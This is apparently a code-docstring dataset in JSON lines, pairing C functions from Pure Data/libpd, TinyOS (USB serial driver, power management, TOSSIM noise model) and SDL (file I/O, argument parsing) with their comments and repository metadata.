{"docstring": "/* -------------------- widget behavior for garray ------------ */\n", "func_signal": "static void garray_getrect(t_gobj *z, t_glist *glist,\n    int *xp1, int *yp1, int *xp2, int *yp2)", "code": "{\n    t_garray *x = (t_garray *)z;\n    gobj_getrect(&x->x_scalar->sc_gobj, glist, xp1, yp1, xp2, yp2);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* LATER protect against the template changing or the scalar disappearing\n    probably by attaching a gpointer here ... */\n", "func_signal": "static void array_motion(void *z, t_floatarg dx, t_floatarg dy)", "code": "{\n    array_motion_xcumulative += dx * array_motion_xperpix;\n    array_motion_ycumulative += dy * array_motion_yperpix;\n    if (array_motion_xfield)\n    {\n            /* it's an x, y plot */\n        int i;\n        for (i = 0; i < array_motion_npoints; i++)\n        {\n            t_word *thisword = (t_word *)(((char *)array_motion_wp) +\n                i * array_motion_elemsize);\n            t_float xwas = fielddesc_getcoord(array_motion_xfield, \n                array_motion_template, thisword, 1);\n            t_float ywas = (array_motion_yfield ?\n                fielddesc_getcoord(array_motion_yfield, \n                    array_motion_template, thisword, 1) : 0);\n            fielddesc_setcoord(array_motion_xfield,\n                array_motion_template, thisword, xwas + dx, 1);\n            if (array_motion_yfield)\n            {\n                if (array_motion_fatten)\n                {\n                    if (i == 0)\n                    {\n                        t_float newy = ywas + dy * array_motion_yperpix;\n                        if (newy < 0)\n                            newy = 0;\n                        fielddesc_setcoord(array_motion_yfield,\n                            array_motion_template, thisword, newy, 1);\n                    }\n                }\n                else\n                {\n                    fielddesc_setcoord(array_motion_yfield,\n                        array_motion_template, thisword,\n                            ywas + dy * array_motion_yperpix, 1);\n                }\n            }\n        }\n    }\n    else if (array_motion_yfield)\n    {\n            /* a y-only plot. */\n        int thisx = array_motion_initx + array_motion_xcumulative + 0.5, x2;\n        int increment, i, nchange;\n        t_float newy = array_motion_ycumulative,\n            oldy = fielddesc_getcoord(array_motion_yfield,\n                array_motion_template,\n                    (t_word *)(((char *)array_motion_wp) +\n                        array_motion_elemsize * array_motion_lastx),\n                            1);\n        t_float ydiff = newy - oldy;\n        if (thisx < 0) thisx = 0;\n        else if (thisx >= array_motion_npoints)\n            thisx = array_motion_npoints - 1;\n        increment = (thisx > array_motion_lastx ? -1 : 1);\n        nchange = 1 + increment * (array_motion_lastx - thisx);\n\n        for (i = 0, x2 = thisx; i < nchange; i++, x2 += increment)\n        {\n            fielddesc_setcoord(array_motion_yfield,\n                array_motion_template,\n                    (t_word *)(((char *)array_motion_wp) +\n                        array_motion_elemsize * x2), newy, 1);\n            if (nchange > 1)\n                newy -= ydiff * (1./(nchange - 1));\n         }\n         array_motion_lastx = thisx;\n    }\n    if (array_motion_scalar)\n        scalar_redraw(array_motion_scalar, array_motion_glist);\n    if (array_motion_array)\n        array_redraw(array_motion_array, array_motion_glist);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* handle \"array\" message to glists; call graph_scalar above with\nan appropriate template; then set size and flags.  This is called\nfrom the menu and in the file format for patches.  LATER replace this\nby a more coherent (and general) invocation. */\n", "func_signal": "t_garray *graph_array(t_glist *gl, t_symbol *s, t_symbol *templateargsym,\n    t_floatarg fsize, t_floatarg fflags)", "code": "{\n    int n = fsize, i, zz, nwords, zonset, ztype, saveit;\n    t_symbol *zarraytype;\n    t_garray *x;\n    t_pd *x2;\n    t_template *template, *ztemplate;\n    t_symbol *templatesym;\n    char *str;\n    int flags = fflags;\n    t_gpointer gp;\n    int filestyle = ((flags & 6) >> 1);\n    int style = (filestyle == 0 ? PLOTSTYLE_POLY :\n        (filestyle == 1 ? PLOTSTYLE_POINTS : filestyle));\n    if (templateargsym != &s_float)\n    {\n        error(\"array %s: only 'float' type understood\", templateargsym->s_name);\n        return (0);\n    }\n    templatesym = gensym(\"pd-_float_array\");\n    template = template_findbyname(templatesym);\n    if (!template)\n    {\n        error(\"array: couldn't find template %s\", templatesym->s_name);\n        return (0);\n    }\n    if (!template_find_field(template, gensym(\"z\"), \n        &zonset, &ztype, &zarraytype))\n    {\n        error(\"array: template %s has no 'z' field\", templatesym->s_name);\n        return (0);\n    }\n    if (ztype != DT_ARRAY)\n    {\n        error(\"array: template %s, 'z' field is not an array\",\n            templatesym->s_name);\n        return (0);\n    }\n    if (!(ztemplate = template_findbyname(zarraytype)))\n    {\n        error(\"array: no template of type %s\", zarraytype->s_name);\n        return (0);\n    }\n    saveit = ((flags & 1) != 0);\n    x = graph_scalar(gl, s, templatesym, saveit);\n    x->x_hidename = ((flags & 8) >> 3);\n\n    if (n <= 0)\n        n = 100;\n    array_resize(x->x_scalar->sc_vec[zonset].w_array, n);\n\n    template_setfloat(template, gensym(\"style\"), x->x_scalar->sc_vec,\n        style, 1);\n    template_setfloat(template, gensym(\"linewidth\"), x->x_scalar->sc_vec, \n        ((style == PLOTSTYLE_POINTS) ? 2 : 1), 1);\n    if (x2 = pd_findbyclass(gensym(\"#A\"), garray_class))\n        pd_unbind(x2, gensym(\"#A\"));\n\n    pd_bind(&x->x_gobj.g_pd, gensym(\"#A\"));\n    garray_redraw(x);\n    return (x);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* sum of Fourier components; called from routines below */\n", "func_signal": "static void garray_dofo(t_garray *x, long npoints, t_float dcval,\n    int nsin, t_float *vsin, int sineflag)", "code": "{\n    double phase, phaseincr, fj;\n    int yonset, i, j, elemsize;\n    t_array *array = garray_getarray_floatonly(x, &yonset, &elemsize);\n    if (!array)\n    {\n        error(\"%s: needs floating-point 'y' field\", x->x_realname->s_name);\n        return;\n    }\n    if (npoints == 0)\n        npoints = 512;  /* dunno what a good default would be... */\n    if (npoints != (1 << ilog2(npoints)))\n        post(\"%s: rounnding to %d points\", array->a_templatesym->s_name,\n            (npoints = (1<<ilog2(npoints))));\n    garray_resize_long(x, npoints + 3);\n    phaseincr = 2. * 3.14159 / npoints;\n    for (i = 0, phase = -phaseincr; i < array->a_n; i++, phase += phaseincr)\n    {\n        double sum = dcval;\n        if (sineflag)\n            for (j = 0, fj = phase; j < nsin; j++, fj += phase)\n                sum += vsin[j] * sin(fj);\n        else\n            for (j = 0, fj = 0; j < nsin; j++, fj += phase)\n                sum += vsin[j] * cos(fj);\n        *((t_float *)((array->a_vec + elemsize * i)) + yonset)\n            = sum;\n    }\n    garray_redraw(x);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "//------------------------------------------------------------------------------\n/// Sets the current serial state of the device to the given value.\n/// \\param serialState  New device state.\n//------------------------------------------------------------------------------\n", "func_signal": "void CDCDSerialDriver_SetSerialState(unsigned short serialState)", "code": "{\n    ASSERT((serialState & 0xFF80) == 0,\n           \"CDCDSerialDriver_SetSerialState: Bits D7-D15 are reserved\\n\\r\");\n\n    // If new state is different from previous one, send a notification to the\n    // host\n    if (cdcdSerialDriver.serialState != serialState) {\n\n        cdcdSerialDriver.serialState = serialState;\n        USBD_Write(CDCDSerialDriverDescriptors_NOTIFICATION,\n                   &(cdcdSerialDriver.serialState),\n                   2,\n                   0,\n                   0);\n\n        // Reset one-time flags\n        cdcdSerialDriver.serialState &= ~(CDCDSerialDriver_STATE_OVERRUN\n                                          | CDCDSerialDriver_STATE_PARITY\n                                          | CDCDSerialDriver_STATE_FRAMING\n                                          | CDCDSerialDriver_STATE_RINGSIGNAL\n                                          | CDCDSerialDriver_STATE_BREAK);\n    }\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\usb\\device\\cdc-serial\\CDCDSerialDriver.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Handles CDC-specific SETUP requests. Should be called from a\n/// re-implementation of USBDCallbacks_RequestReceived() method.\n/// \\param Pointer to a USBGenericRequest instance.\n//------------------------------------------------------------------------------\n", "func_signal": "void CDCDSerialDriver_RequestHandler(const USBGenericRequest *request)", "code": "{\n    TRACE_INFO_WP(\"NewReq \");\n\n    // Handle the request\n    switch (USBGenericRequest_GetRequest(request)) {\n\n        case CDCGenericRequest_SETLINECODING:\n            \n            CDCDSerialDriver_SetLineCoding();\n            break;\n\n        case CDCGenericRequest_GETLINECODING:\n\n            CDCDSerialDriver_GetLineCoding();\n            break;\n\n        case CDCGenericRequest_SETCONTROLLINESTATE:\n\n            CDCDSerialDriver_SetControlLineState(\n                CDCSetControlLineStateRequest_ActivateCarrier(request),\n                CDCSetControlLineStateRequest_IsDtePresent(request));\n\n            break;\n\n        default:\n\n            USBDDriver_RequestHandler(&(cdcdSerialDriver.usbdDriver), request);\n            break;\n    }\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\usb\\device\\cdc-serial\\CDCDSerialDriver.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Sets the fast wake-up inputs that can get the device out of Wait mode.\n/// \\param inputs  Fast wake-up inputs to enable.\n//------------------------------------------------------------------------------\n", "func_signal": "void PMC_SetFastWakeUpInputs(unsigned int inputs)", "code": "{\n    SANITY_CHECK((inputs & ~0xFF) == 0);\n    AT91C_BASE_PMC->PMC_FSMR = inputs;\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\peripherals\\pmc\\pmc.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Disables the clock of a peripheral. The peripheral ID (AT91C_ID_xxx) is used\n/// to identify which peripheral is targetted.\n/// Note that the ID must NOT be shifted (i.e. 1 << AT91C_ID_xxx).\n/// \\param id  Peripheral ID (AT91C_ID_xxx).\n//------------------------------------------------------------------------------\n", "func_signal": "void PMC_DisablePeripheral(unsigned int id)", "code": "{\n    SANITY_CHECK(id < 32);\n\n    if ((AT91C_BASE_PMC->PMC_PCSR & (1 << id)) != (1 << id)) {\n\n        TRACE_INFO(\"PMC_DisablePeripheral: clock of peripheral\"\n                   \" %u is not enabled\\n\\r\",\n                   id);\n    }\n    else {\n\n        AT91C_BASE_PMC->PMC_PCDR = 1 << id;\n    }\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\peripherals\\pmc\\pmc.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "/* \n * When initialization process is going on, make noise model by putting\n * experimental noise values.\n */\n", "func_signal": "void makeNoiseModel(uint16_t node_id)__attribute__ ((C, spontaneous))", "code": "{\n  int i;\n  for(i=0; i<NOISE_HISTORY; i++) {\n    noiseData[node_id].key[i] = search_bin_num(noiseData[node_id].noiseTrace[i]);\n    dbg(\"Insert\", \"Setting history %i to be %i\\n\", (int)i, (int)noiseData[node_id].key[i]);\n  }\n  \n  //sim_noise_add(node_id, noiseData[node_id].noiseTrace[NOISE_HISTORY]);\n  //arrangeKey(node_id);\n  \n  for(i = NOISE_HISTORY; i < noiseData[node_id].noiseTraceIndex; i++) {\n    sim_noise_add(node_id, noiseData[node_id].noiseTrace[i]);\n    arrangeKey(node_id);\n    noiseData[node_id].key[NOISE_HISTORY-1] = search_bin_num(noiseData[node_id].noiseTrace[i]);\n  }\n  noiseData[node_id].generated = 1;\n}", "path": "tos\\lib\\tossim\\sim_noise.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Receives data from the host through the virtual COM port created by\n/// the CDC device serial driver. This function behaves like USBD_Read.\n/// \\param data Pointer to the data buffer to put received data.\n/// \\param size Size of the data buffer in bytes.\n/// \\param callback Optional callback function to invoke when the transfer\n///                 finishes.\n/// \\param argument Optional argument to the callback function.\n/// \\return USBD_STATUS_SUCCESS if the read operation has been started normally;\n///         otherwise, the corresponding error code.\n//------------------------------------------------------------------------------\n", "func_signal": "unsigned char CDCDSerialDriver_Read(void *data,\n                                    unsigned int size,\n                                    TransferCallback callback,\n                                    void *argument)", "code": "{\n    return USBD_Read(CDCDSerialDriverDescriptors_DATAOUT,\n                     data,\n                     size,\n                     callback,\n                     argument);\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\usb\\device\\cdc-serial\\CDCDSerialDriver.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Returns the direction of the data transfer following the given request.\n/// \\param request Pointer to a USBGenericRequest instance.\n/// \\return Transfer direction.\n/// \\sa \"USB Request Directions\"\n//------------------------------------------------------------------------------\n", "func_signal": "unsigned char USBGenericRequest_GetDirection(const USBGenericRequest *request)", "code": "{\n    // Transfer direction is located in bit D7 of the bmRequestType field\n    if ((request->bmRequestType & 0x80) != 0) {\n\n        return USBGenericRequest_IN;\n    }\n    else {\n\n        return USBGenericRequest_OUT;\n    }\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\usb\\common\\core\\USBGenericRequest.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Disables the main oscillator, making the device enter Wait mode.\n//------------------------------------------------------------------------------\n", "func_signal": "void PMC_DisableMainOscillatorForWaitMode(void)", "code": "{\n    AT91C_BASE_PMC->PMC_MOR = 0x37 << 16;\n    while ((AT91C_BASE_PMC->PMC_MOR & AT91C_PMC_MAINSELS) != AT91C_PMC_MAINSELS);\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\peripherals\\pmc\\pmc.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "/* Convert 2's complement 'length' bit integer 'x' from unsigned to signed\n */\n", "func_signal": "static int64_t u2s(uint64_t x, size_t length)", "code": "{\n  if (x & 1ULL << (length - 1))\n    return (int64_t)x - (1LL << length);\n  else\n    return x;\n}", "path": "support\\sdk\\c\\sf\\message.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Receives new line coding information from the USB host.\n//------------------------------------------------------------------------------\n", "func_signal": "static void CDCDSerialDriver_SetLineCoding()", "code": "{\n    TRACE_INFO_WP(\"sLineCoding \");\n\n    USBD_Read(0,\n              (void *) &(cdcdSerialDriver.lineCoding),\n              sizeof(CDCLineCoding),\n              (TransferCallback) CDCDSerialDriver_SetLineCodingCallback,\n              0);\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\usb\\device\\cdc-serial\\CDCDSerialDriver.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Sends the current line coding information to the host through Control\n/// endpoint 0.\n//------------------------------------------------------------------------------\n", "func_signal": "static void CDCDSerialDriver_GetLineCoding()", "code": "{\n    TRACE_INFO_WP(\"gLineCoding \");\n\n    USBD_Write(0,\n               (void *) &(cdcdSerialDriver.lineCoding),\n               sizeof(CDCLineCoding),\n               0,\n               0);\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\usb\\device\\cdc-serial\\CDCDSerialDriver.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Put the CPU in Idle Mode for lower consumption\n//------------------------------------------------------------------------------\n", "func_signal": "void PMC_CPUInIdleMode(void)", "code": "{\n#ifndef CP15_PRESENT\t\n    PMC_DisableProcessorClock();\n#else\n    AT91C_BASE_PMC->PMC_SCDR = AT91C_PMC_PCK; \n    CP15_WaitForInterrupt();\n#endif\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\peripherals\\pmc\\pmc.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Disables the processor clock\n//------------------------------------------------------------------------------\n", "func_signal": "void PMC_DisableProcessorClock(void)", "code": "{    \n    AT91C_BASE_PMC->PMC_SCDR = AT91C_PMC_PCK;   \n    while ((AT91C_BASE_PMC->PMC_SCSR & AT91C_PMC_PCK) != AT91C_PMC_PCK); \n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\peripherals\\pmc\\pmc.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "/* Check if a specified bit field is in range for a buffer, and invoke\n   tmsg_fail if not. Return TRUE if in range, FALSE otherwise */\n", "func_signal": "static int boundsp(tmsg_t *msg, size_t offset, size_t length)", "code": "{\n  if (offset + length <= msg->len * 8)\n    return 1;\n\n  tmsg_fail();\n  return 0;\n}", "path": "support\\sdk\\c\\sf\\message.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "/*\n * After makeNoiseModel() is done, make PMF distribution for each bin.\n */\n", "func_signal": "void makePmfDistr(uint16_t node_id)__attribute__ ((C, spontaneous))", "code": "{\n  int i;\n  char *pKey = noiseData[node_id].key;\n  char *fKey = noiseData[node_id].freqKey;\n\n  FreqKeyNum = 0;\n  for(i=0; i<NOISE_HISTORY; i++) {\n    pKey[i] = /* noiseData[node_id].noiseTrace[i]; // */ search_bin_num(noiseData[node_id].noiseTrace[i]);\n  }\n\n  for(i = NOISE_HISTORY; i < noiseData[node_id].noiseTraceIndex; i++) {\n    if (i == NOISE_HISTORY) {\n      //printf(\"Inserting first element.\\n\");\n    }\n    sim_noise_dist(node_id);\n    arrangeKey(node_id);\n    pKey[NOISE_HISTORY-1] =  search_bin_num(noiseData[node_id].noiseTrace[i]);\n  }\n\n  dbg_clear(\"HASH\", \"FreqKey = \");\n  for (i=0; i< NOISE_HISTORY ; i++)\n    {\n      dbg_clear(\"HASH\", \"%d,\", fKey[i]);\n    }\n  dbg_clear(\"HASH\", \"\\n\");\n}", "path": "tos\\lib\\tossim\\sim_noise.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Enable all the periph clock via PMC\n/// (Becareful of the last 2 bits, it is not periph clock)\n//------------------------------------------------------------------------------\n", "func_signal": "void PMC_EnableAllPeripherals(void)", "code": "{\n    AT91C_BASE_PMC->PMC_PCER = MASK_STATUS;\n    while( (AT91C_BASE_PMC->PMC_PCSR & MASK_STATUS) != MASK_STATUS);\n    TRACE_INFO(\"Enable all periph clocks\\n\\r\"); \n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\peripherals\\pmc\\pmc.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Disable all the periph clock via PMC\n/// (Becareful of the last 2 bits, it is not periph clock)\n//------------------------------------------------------------------------------\n", "func_signal": "void PMC_DisableAllPeripherals(void)", "code": "{\n    AT91C_BASE_PMC->PMC_PCDR = MASK_STATUS;\n    while((AT91C_BASE_PMC->PMC_PCSR & MASK_STATUS) != 0);\n    TRACE_INFO(\"Disable all periph clocks\\n\\r\");\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\peripherals\\pmc\\pmc.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Sends a data buffer through the virtual COM port created by the CDC\n/// device serial driver. This function behaves exactly like USBD_Write.\n/// \\param data Pointer to the data buffer to send.\n/// \\param size Size of the data buffer in bytes.\n/// \\param callback Optional callback function to invoke when the transfer\n///                 finishes.\n/// \\param argument Optional argument to the callback function.\n/// \\return USBD_STATUS_SUCCESS if the read operation has been started normally;\n///         otherwise, the corresponding error code.\n//------------------------------------------------------------------------------\n", "func_signal": "unsigned char CDCDSerialDriver_Write(void *data,\n                                     unsigned int size,\n                                     TransferCallback callback,\n                                     void *argument)", "code": "{\n    return USBD_Write(CDCDSerialDriverDescriptors_DATAIN,\n                      data,\n                      size,\n                      callback,\n                      argument);\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\usb\\device\\cdc-serial\\CDCDSerialDriver.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Disables the main oscillator when NOT running on it.\n//------------------------------------------------------------------------------\n", "func_signal": "void PMC_DisableMainOscillator(void)", "code": "{\n    AT91C_BASE_PMC->PMC_MOR = 0x37 << 16;\n    while ((AT91C_BASE_PMC->PMC_SR & AT91C_PMC_MAINSELS) == AT91C_PMC_MAINSELS);\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\peripherals\\pmc\\pmc.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "//------------------------------------------------------------------------------\n/// Changes the state of the serial driver according to the information\n/// sent by the host via a SetControlLineState request, and acknowledges\n/// the request with a zero-length packet.\n//------------------------------------------------------------------------------\n", "func_signal": "static void CDCDSerialDriver_SetControlLineState(unsigned char activateCarrier,\n                                                 unsigned char isDTEPresent)", "code": "{\n    TRACE_INFO_WP(\n              \"sControlLineState(%d, %d) \",\n              activateCarrier,\n              isDTEPresent);\n\n    cdcdSerialDriver.isCarrierActivated = activateCarrier;\n    USBD_Write(0, 0, 0, 0, 0);\n}", "path": "tos\\chips\\cortex\\m3\\sam3\\u\\usb\\usb\\device\\cdc-serial\\CDCDSerialDriver.c", "repo_name": "tinyos/tinyos-release", "stars": 84, "license": "None", "language": "c", "size": 31588}
{"docstring": "/* Functions for dynamically reading and writing endian-specific values */\n", "func_signal": "Uint16 SDL_ReadLE16 (SDL_RWops *src)", "code": "{\n\tUint16 value;\n\n\tSDL_RWread(src, &value, (sizeof value), 1);\n\treturn(SDL_SwapLE16(value));\n}", "path": "src\\file\\SDL_rwops.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/*\n * translate unix-style slash-separated filename to mac-style colon-separated\n * name; return malloced string\n */\n", "func_signal": "static char *unix_to_mac(const char *file)", "code": "{\n\tint flen = SDL_strlen(file);\n\tchar *path = SDL_malloc(flen + 2);\n\tconst char *src = file;\n\tchar *dst = path;\n\tif(*src == '/') {\n\t\t/* really depends on filesystem layout, hope for the best */\n\t\tsrc++;\n\t} else {\n\t\t/* Check if this is a MacOS path to begin with */\n\t\tif(*src != ':')\n\t\t\t*dst++ = ':';   /* relative paths begin with ':' */\n\t}\n\twhile(src < file + flen) {\n\t\tconst char *end = SDL_strchr(src, '/');\n\t\tint len;\n\t\tif(!end)\n\t\t\tend = file + flen; /* last component */\n\t\tlen = end - src;\n\t\tif(len == 0 || (len == 1 && src[0] == '.')) {\n\t\t\t/* remove repeated slashes and . */\n\t\t} else {\n\t\t\tif(len == 2 && src[0] == '.' && src[1] == '.') {\n\t\t\t\t/* replace .. with the empty string */\n\t\t\t} else {\n\t\t\t\tSDL_memcpy(dst, src, len);\n\t\t\t\tdst += len;\n\t\t\t}\n\t\t\tif(end < file + flen)\n\t\t\t\t*dst++ = ':';\n\t\t}\n\t\tsrc = end + 1;\n\t}\n\t*dst++ = '\\0';\n\treturn path;\n}", "path": "src\\file\\SDL_rwops.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* Parse a command line buffer into arguments */\n", "func_signal": "static int ParseCommandLine(char *cmdline, char **argv)", "code": "{\n\tchar *bufp;\n\tint argc;\n\n\targc = 0;\n\tfor ( bufp = cmdline; *bufp; ) {\n\t\t/* Skip leading whitespace */\n\t\twhile ( SDL_isspace(*bufp) ) {\n\t\t\t++bufp;\n\t\t}\n\t\t/* Skip over argument */\n\t\tif ( *bufp == '\"' ) {\n\t\t\t++bufp;\n\t\t\tif ( *bufp ) {\n\t\t\t\tif ( argv ) {\n\t\t\t\t\targv[argc] = bufp;\n\t\t\t\t}\n\t\t\t\t++argc;\n\t\t\t}\n\t\t\t/* Skip over word */\n\t\t\twhile ( *bufp && (*bufp != '\"') ) {\n\t\t\t\t++bufp;\n\t\t\t}\n\t\t} else {\n\t\t\tif ( *bufp ) {\n\t\t\t\tif ( argv ) {\n\t\t\t\t\targv[argc] = bufp;\n\t\t\t\t}\n\t\t\t\t++argc;\n\t\t\t}\n\t\t\t/* Skip over word */\n\t\t\twhile ( *bufp && ! SDL_isspace(*bufp) ) {\n\t\t\t\t++bufp;\n\t\t\t}\n\t\t}\n\t\tif ( *bufp ) {\n\t\t\tif ( argv ) {\n\t\t\t\t*bufp = '\\0';\n\t\t\t}\n\t\t\t++bufp;\n\t\t}\n\t}\n\tif ( argv ) {\n\t\targv[argc] = NULL;\n\t}\n\treturn(argc);\n}", "path": "src\\main\\macos\\SDL_main.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* Functions to read/write memory pointers */\n", "func_signal": "static int SDLCALL mem_seek(SDL_RWops *context, int offset, int whence)", "code": "{\n\tUint8 *newpos;\n\n\tswitch (whence) {\n\t\tcase RW_SEEK_SET:\n\t\t\tnewpos = context->hidden.mem.base+offset;\n\t\t\tbreak;\n\t\tcase RW_SEEK_CUR:\n\t\t\tnewpos = context->hidden.mem.here+offset;\n\t\t\tbreak;\n\t\tcase RW_SEEK_END:\n\t\t\tnewpos = context->hidden.mem.stop+offset;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tSDL_SetError(\"Unknown value for 'whence'\");\n\t\t\treturn(-1);\n\t}\n\tif ( newpos < context->hidden.mem.base ) {\n\t\tnewpos = context->hidden.mem.base;\n\t}\n\tif ( newpos > context->hidden.mem.stop ) {\n\t\tnewpos = context->hidden.mem.stop;\n\t}\n\tcontext->hidden.mem.here = newpos;\n\treturn(context->hidden.mem.here-context->hidden.mem.base);\n}", "path": "src\\file\\SDL_rwops.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* Exception handler to prevent the Audio thread hanging, making a zombie process! */\n", "func_signal": "ULONG _System SDL_Main_ExceptionHandler(PEXCEPTIONREPORTRECORD pERepRec,\n                                        PEXCEPTIONREGISTRATIONRECORD pERegRec,\n                                        PCONTEXTRECORD pCtxRec,\n                                        PVOID p)", "code": "{\n  if (pERepRec->fHandlerFlags & EH_EXIT_UNWIND)\n    return XCPT_CONTINUE_SEARCH;\n  if (pERepRec->fHandlerFlags & EH_UNWINDING)\n    return XCPT_CONTINUE_SEARCH;\n  if (pERepRec->fHandlerFlags & EH_NESTED_CALL)\n    return XCPT_CONTINUE_SEARCH;\n\n  /* Do cleanup at every fatal exception! */\n  if (((pERepRec->ExceptionNum & XCPT_SEVERITY_CODE) == XCPT_FATAL_EXCEPTION) &&\n      (pERepRec->ExceptionNum != XCPT_BREAKPOINT) &&\n      (pERepRec->ExceptionNum != XCPT_SINGLE_STEP)\n     )\n  {\n    if (SDL_initialized & SDL_INIT_AUDIO)\n    {\n      /* This removes the zombie audio thread in case of emergency. */\n#ifdef DEBUG_BUILD\n      printf(\"[SDL_Main_ExceptionHandler] : Calling SDL_CloseAudio()!\\n\");\n#endif\n      SDL_CloseAudio();\n    }\n  }\n  return (XCPT_CONTINUE_SEARCH);\n}", "path": "src\\SDL.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
{"docstring": "/* __MACOS__ */\n", "func_signal": "SDL_RWops *SDL_RWFromFile(const char *file, const char *mode)", "code": "{\n\tSDL_RWops *rwops = NULL;\n#ifdef HAVE_STDIO_H\n\tFILE *fp = NULL;\n#endif\n\tif ( !file || !*file || !mode || !*mode ) {\n\t\tSDL_SetError(\"SDL_RWFromFile(): No file or no mode specified\");\n\t\treturn NULL;\n\t}\n\n#if defined(__WIN32__) && !defined(__SYMBIAN32__)\n\trwops = SDL_AllocRW();\n\tif (!rwops)\n\t\treturn NULL; /* SDL_SetError already setup by SDL_AllocRW() */\n\tif (win32_file_open(rwops,file,mode) < 0) {\n\t\tSDL_FreeRW(rwops);\n\t\treturn NULL;\n\t}\t\n\trwops->seek  = win32_file_seek;\n\trwops->read  = win32_file_read;\n\trwops->write = win32_file_write;\n\trwops->close = win32_file_close;\n\n#elif HAVE_STDIO_H\n\n#ifdef __MACOS__\n\t{\n\t\tchar *mpath = unix_to_mac(file);\n\t\tfp = fopen(mpath, mode);\n\t\tSDL_free(mpath);\n\t}\n#else\n\tfp = fopen(file, mode);\n#endif\n\tif ( fp == NULL ) {\n\t\tSDL_SetError(\"Couldn't open %s\", file);\n\t} else {\n\t\trwops = SDL_RWFromFP(fp, 1);\n\t}\n#else\n\tSDL_SetError(\"SDL not compiled with stdio support\");\n#endif /* !HAVE_STDIO_H */\n\n\treturn(rwops);\n}", "path": "src\\file\\SDL_rwops.c", "repo_name": "coolsee/OpenMugen", "stars": 74, "license": "None", "language": "c", "size": 2140}
